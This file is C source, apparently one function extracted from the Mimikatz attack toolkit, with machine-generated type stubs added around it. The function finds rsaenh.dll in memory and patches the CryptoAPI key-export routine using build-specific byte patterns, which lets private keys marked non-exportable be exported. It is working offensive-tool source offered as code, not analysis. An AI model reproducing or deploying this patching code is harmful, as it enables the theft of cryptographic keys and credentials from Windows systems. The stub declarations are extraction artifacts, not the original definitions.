#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_27__   TYPE_9__ ;
typedef  struct TYPE_26__   TYPE_8__ ;
typedef  struct TYPE_25__   TYPE_7__ ;
typedef  struct TYPE_24__   TYPE_6__ ;
typedef  struct TYPE_23__   TYPE_5__ ;
typedef  struct TYPE_22__   TYPE_4__ ;
typedef  struct TYPE_21__   TYPE_3__ ;
typedef  struct TYPE_20__   TYPE_2__ ;
typedef  struct TYPE_19__   TYPE_1__ ;
typedef  struct TYPE_18__   TYPE_11__ ;
typedef  struct TYPE_17__   TYPE_10__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
struct TYPE_22__ {scalar_t__ address; } ;
struct TYPE_27__ {TYPE_4__ DllBase; scalar_t__ SizeOfImage; } ;
struct TYPE_25__ {int /*<<< orphan*/  off0; } ;
struct TYPE_24__ {int /*<<< orphan*/  Length; int /*<<< orphan*/  Pattern; } ;
struct TYPE_23__ {int /*<<< orphan*/  Length; int /*<<< orphan*/  Pattern; } ;
struct TYPE_26__ {TYPE_7__ Offsets; TYPE_6__ Patch; TYPE_5__ Search; } ;
struct TYPE_21__ {scalar_t__ size; } ;
struct TYPE_20__ {int /*<<< orphan*/ * member_1; scalar_t__ member_0; } ;
struct TYPE_19__ {int /*<<< orphan*/  member_1; TYPE_2__ member_0; } ;
struct TYPE_18__ {int /*<<< orphan*/  address; int /*<<< orphan*/ * member_1; int /*<<< orphan*/ * member_0; } ;
struct TYPE_17__ {TYPE_3__ kull_m_memoryRange; int /*<<< orphan*/ * member_1; TYPE_1__ member_0; } ;
typedef  TYPE_8__* PKULL_M_PATCH_GENERIC ;
typedef  scalar_t__ PBYTE ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  TYPE_9__ KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION ;
typedef  TYPE_10__ KULL_M_MEMORY_SEARCH ;
typedef  TYPE_11__ KULL_M_MEMORY_ADDRESS ;

/* Variables and functions */
 int /*<<< orphan*/  ARRAYSIZE (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  Capi4000References ; 
 int /*<<< orphan*/  Capi4001References ; 
 int /*<<< orphan*/  KULL_M_MEMORY_GLOBAL_OWN_HANDLE ; 
 scalar_t__ K_CPExportKey ; 
 int /*<<< orphan*/  MIMIKATZ_NT_BUILD_NUMBER ; 
 int /*<<< orphan*/  PRINT_ERROR_AUTO (char*) ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  kprintf (char*) ; 
 scalar_t__ kull_m_patch (TYPE_10__*,TYPE_11__*,int /*<<< orphan*/ ,TYPE_11__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 TYPE_8__* kull_m_patch_getGenericFromBuild (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ kull_m_process_getVeryBasicModuleInformationsForName (int /*<<< orphan*/ *,char*,TYPE_9__*) ; 

NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
{
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleRsaEnh;
	KULL_M_MEMORY_ADDRESS
		aPattern4001Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPattern4000Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatch4001Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatch4000Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000;
	
	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
	if(currentReference4001 && currentReference4000)
	{
		aPattern4001Memory.address = currentReference4001->Search.Pattern;
		aPattern4000Memory.address = currentReference4000->Search.Pattern;
		aPatch4001Memory.address = currentReference4001->Patch.Pattern;
		aPatch4000Memory.address = currentReference4000->Patch.Pattern;
		if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"rsaenh.dll", &iModuleRsaEnh))
		{
			sMemory.kull_m_memoryRange.size = iModuleRsaEnh.SizeOfImage - ((PBYTE) K_CPExportKey - (PBYTE) iModuleRsaEnh.DllBase.address);
		
			if(	kull_m_patch(&sMemory, &aPattern4001Memory, currentReference4001->Search.Length, &aPatch4001Memory, currentReference4001->Patch.Length, currentReference4001->Offsets.off0, NULL, 0, NULL, NULL)	&&
				kull_m_patch(&sMemory, &aPattern4000Memory, currentReference4000->Search.Length, &aPatch4000Memory, currentReference4000->Patch.Length, currentReference4000->Offsets.off0, NULL, 0, NULL, NULL)	)
				kprintf(L"Local CryptoAPI patched\n");
			else
				PRINT_ERROR_AUTO(L"kull_m_patch");

		} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
	}					
	return STATUS_SUCCESS;
}